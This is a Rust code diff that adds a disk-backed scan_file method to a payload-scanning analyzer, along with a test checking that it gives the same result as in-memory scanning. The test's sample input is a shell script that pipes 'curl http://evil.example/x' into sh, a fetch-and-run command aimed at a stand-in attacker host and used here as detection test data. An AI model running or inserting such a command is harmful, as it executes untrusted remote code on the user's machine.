@@ -153,6 +153,30 @@ impl Analyzer {
         )
     }
 
+    /// Scan a payload that already lives on disk, returning the same
+    /// [`ScanResult`] as [`scan_bytes`]. cleave memory-maps the file, so peak
+    /// resident memory stays bounded no matter how large the payload is — use
+    /// this for streamed-to-disk responses too big to buffer whole in RAM.
+    ///
+    /// `read_path` is the on-disk file to analyze; `filename` is the logical
+    /// name (e.g. the originating URL) echoed back in [`ScanResult::path`].
+    /// `read_path`'s extension drives cleave's type detection, so give the
+    /// temporary file a name carrying the payload's real extension.
+    ///
+    /// # Errors
+    /// Propagates filesystem errors, cleave analysis failures, and model
+    /// inference errors.
+    pub fn scan_file(&self, read_path: &Path, filename: &str) -> Result<ScanResult> {
+        engine::scan_file(
+            read_path,
+            filename,
+            &self.model,
+            &self.ctx,
+            self.shap.as_ref(),
+            &self.config,
+        )
+    }
+
     /// Scan a file or directory on disk. Returns aggregate counts; per-file
     /// results are emitted via the configured output format.
     ///
@@ -199,5 +223,27 @@ mod tests {
         // We don't assert a specific verdict — model-correctness is litmus's
         // concern, not the analyzer scaffolding's.
         assert!(r.probability.is_finite());
+    }
+
+    /// A disk-backed `scan_file` must reach the same classification as an
+    /// in-memory `scan_bytes` on identical bytes — the property hood relies on
+    /// when it spills large responses to disk. Same artifact requirement, so
+    /// `#[ignore]` by default (see `analyzer_loads_and_scans`).
+    #[test]
+    #[ignore]
+    fn scan_file_matches_scan_bytes() {
+        let dir = std::env::var("SCAN_MODELS_DIR")
+            .expect("set SCAN_MODELS_DIR to a populated model directory");
+        let analyzer = Analyzer::load(dir).expect("load");
+        let body = b"#!/bin/sh\ncurl http://evil.example/x | sh\n".to_vec();
+
+        let tmp = std::env::temp_dir().join("scan_file_parity_install.sh");
+        std::fs::write(&tmp, &body).expect("write temp");
+
+        let from_mem = analyzer.scan_bytes(body, "install.sh").expect("scan_bytes");
+        let from_disk = analyzer.scan_file(&tmp, "install.sh").expect("scan_file");
+        std::fs::remove_file(&tmp).ok();
+
+        assert_eq!(from_mem.classification, from_disk.classification);
     }
 }
